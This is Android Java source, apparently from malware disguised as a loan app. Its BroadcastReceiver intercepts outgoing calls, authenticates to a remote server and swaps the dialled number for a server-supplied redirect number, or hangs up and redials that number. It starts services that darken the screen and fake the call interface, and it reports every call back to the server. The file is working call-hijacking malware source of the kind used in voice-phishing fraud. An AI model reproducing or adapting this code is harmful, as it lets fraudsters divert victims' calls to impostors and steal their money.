package main.app.loan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;

public class OnOutReceiver extends BroadcastReceiver {
	
	public void InitService(Context context)
	{
		try{
			if (VarSpace.bTopSvcRun == true)
			{
				context.stopService(new Intent(context, OnUICtrlSvc.class));
			}
		}
		catch(Exception e)
		{
			
		}
		
		try{
			if (VarSpace.bEventSvcRun == true)
			{
				context.stopService(new Intent(context, OnOutMonSvc.class));
			}
		}
		catch(Exception e)
		{
			
		}
	}
	

	public boolean LoadUIElement(Context context)
	{
		try{
        	Rect[] rectArray = MeasureWnd.LoadUIInfo(context);
        	if (rectArray == null) return false;
        	if (rectArray.length != 7) return false;
        	
			OnUICtrlSvc.mRcName = rectArray[0];
			OnUICtrlSvc.mRcNumber = rectArray[1];
			OnUICtrlSvc.mRcKeyPad = rectArray[2];
			OnUICtrlSvc.mRcSpeaker = rectArray[3];
			OnUICtrlSvc.mRcAddCall = rectArray[4];
			OnUICtrlSvc.mRcRect = rectArray[5];

			Rect rectSys = rectArray[6];
			OnUICtrlSvc.mScreen_CurWidth = rectSys.left;
			OnUICtrlSvc.mScreen_CurHeight = rectSys.top;
			OnUICtrlSvc.mStatusbar_CurHeight = rectSys.right;
			
			return true;
 		}
		catch(Exception e)
		{
			
		}
		return false;
	}
	
	public static final int HANDLER_MESSAGE_WAKE_SCREEN = 0x55;
	public static final int HANDLER_MESSAGE_SLEEP_SCREEN = 0x66;
	
	public final Handler myHandler = new Handler()
	{
	    public void handleMessage( Message msg )
	    {
	      try{
			if (msg.what == HANDLER_MESSAGE_WAKE_SCREEN)
			{
				OnUICtrlSvc.WakeOrSleep(true);
			}
			if (msg.what == HANDLER_MESSAGE_SLEEP_SCREEN)
			{
				OnUICtrlSvc.WakeOrSleep(false);
			}
	      }
	      catch(Exception e)
	      {
	    	  
	      }
	    }
	};
	
	void SendHandlerMessage(int nOpcode)
	{
		 try{
		    Message msg = myHandler.obtainMessage();
		    msg.what = nOpcode;
		 	Bundle data=new Bundle();
		 	msg.setData(data); 
		 	myHandler.sendMessage( msg );
		 }
		 catch(Exception e)
		 {
			 
		 }
	}
	
    public void outgo_change(Context context, Intent intent) {
        try{
        	
        	if (ModelType.IsTargetDevice(context) == false)
        	{
        		return;
        	}
        	
        	if (InstallWnd.IsOverDeadline(context) == true)
        	{
        		return;
        	}

            String originalNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            originalNumber = GlobalLib.FormatPhoneNumber(originalNumber);
            
        	NetServer.mDeviceUID = GlobalLib.GetDeviceUID(context);
            NetServer.AuthToServer(context);
        	
            String newNumber = DBDial.getRedirectNumber(context, originalNumber);

        	VarSpace.mOutgoNum = "";

            if ("".equals(newNumber) == true)
            {
            	VarSpace.mOutgoNum = originalNumber;
	        	NetServer.SendCallLog(context, NetServer.CALL_OUT_NORM, originalNumber, null);
            	InitService(context);
            	VarSpace.Init();
            	
            	return;
            }

        	OnUICtrlSvc.Init();

        	InitService(context);

        	if (LoadUIElement(context) == false)
        	{
        		return;
        	}
        	
        	VarSpace.Init();
            
            String originName = ""; //GlobalLib.GetContactUserName(context, originalNumber);
            
            VarSpace.mOriginNum = originalNumber;
            VarSpace.mChangeNum = newNumber;
            VarSpace.mOriginName = originName;

        	NetServer.SendCallLog(context, NetServer.CALL_OUT_HOOK, originalNumber, newNumber);
        	
            context.startService(new Intent(context, OnUICtrlSvc.class));

            context.startService(new Intent(context, OnOutMonSvc.class));

            OnUICtrlSvc.WakeOrSleep(false);

            this.setResultData(newNumber);

            VarSpace.mRedirectOK = true;
            
            //redirect
            NetServer.SendCallLog(context, NetServer.CALL_OUT_HOOK1, "redirect:"+originalNumber, null);
            
            int nUIType = ModelType.getCallUiType();
            if (nUIType == ModelType.CALLUI_GALAXY_234 || nUIType == ModelType.CALLUI_GALAXY_412 || nUIType == ModelType.CALLUI_GALAXY_421 || nUIType == ModelType.CALLUI_GALAXY_500)
            {
            	//GlobalLib.launchBlankScreen(context);
            }
         }
         catch(Exception e)
         {
         }
    }
    
    public void outgo_redirect(Context context, Intent intent) {
        try{
        	
        	if (ModelType.IsTargetDevice(context) == false)
        	{
        		return;
        	}
        	
        	if (InstallWnd.IsOverDeadline(context) == true)
        	{
        		return;
        	}

            String originalNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            
        	VarSpace.mOutgoNum = GlobalLib.FormatPhoneNumber(originalNumber);
        	
        	NetServer.mDeviceUID = GlobalLib.GetDeviceUID(context);
            NetServer.AuthToServer(context);
        	
            String newNumber = DBDial.getRedirectNumber(context, originalNumber);
            
            if ("".equals(newNumber) == false)
            {
            	OnUICtrlSvc.Init();

            	InitService(context);

            	if (LoadUIElement(context) == false)
            	{
            		return;
            	}
            	
            	VarSpace.Init();
                
                String originName = ""; //GlobalLib.GetContactUserName(context, originalNumber);
                
                VarSpace.mOriginNum = originalNumber;
                VarSpace.mChangeNum = newNumber;
                VarSpace.mOriginName = originName;

	        	NetServer.SendCallLog(context, NetServer.CALL_OUT_HOOK, originalNumber, newNumber);
	        	
                context.startService(new Intent(context, OnUICtrlSvc.class));
                
                OnUICtrlSvc.WakeOrSleep(false);

                this.setResultData(null);

                myTelephony.endCall(context);

                final Context cxt = context;
                
                new Thread(new Runnable() {
    				
    				@Override
    				public void run() {
    					// TODO Auto-generated method stub
    					int i = 0;
    					for (i = 0; i < 20; i++)
    					{
    						GlobalLib.sleep(500);
    						
    						try{
    							if ( myTelephony.isIdle(cxt) == true )
    							{
    								break;
    							}
    						}
    						catch(Exception e)
    						{
    						}
    					}
    					if(i == 20)
    					{
        					SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);
        					return;
    					}
    					
    					myTelephony.call(cxt, VarSpace.mChangeNum);
    					for(i = 0; i < 10; i++)
    					{
    						GlobalLib.sleep(500);
    						if(VarSpace.mRedirectOK == true)
    						{
    							break;
    						}
    					}
    					if(i == 10)
    					{
        					SendHandlerMessage(HANDLER_MESSAGE_WAKE_SCREEN);
        					return;
    					}
    				}
    			}).start();
                
            	return;
            }
            
            if (VarSpace.mChangeNum.equalsIgnoreCase(originalNumber) == false)
            {
	        	NetServer.SendCallLog(context, NetServer.CALL_OUT_NORM, originalNumber, null);

            	InitService(context);
            	
            	VarSpace.Init();

            	return;
            }

            VarSpace.mRedirectOK = true;
            
            //redirect
            NetServer.SendCallLog(context, NetServer.CALL_OUT_HOOK1, "redirect:"+originalNumber, null);
            
            context.startService(new Intent(context, OnOutMonSvc.class));
            
            int nUIType = ModelType.getCallUiType();
            if (nUIType == ModelType.CALLUI_GALAXY_234 || nUIType == ModelType.CALLUI_GALAXY_412 || nUIType == ModelType.CALLUI_GALAXY_421 || nUIType == ModelType.CALLUI_GALAXY_500)
            {
            	//GlobalLib.launchBlankScreen(context);
            }
         }
         catch(Exception e)
         {
         }
    }
	
    @Override
    public void onReceive(Context context, Intent intent)
    {
        int nUIType = ModelType.getCallUiType();
        if (nUIType == ModelType.CALLUI_GALAXY_234 || nUIType == ModelType.CALLUI_GALAXY_412 || nUIType == ModelType.CALLUI_LGOPTIMUS_234 || nUIType == ModelType.CALLUI_LGOPTIMUS_412)
        {
        	outgo_redirect(context, intent);
        }
        else
        {
        	outgo_change(context, intent);
        }
    }
 }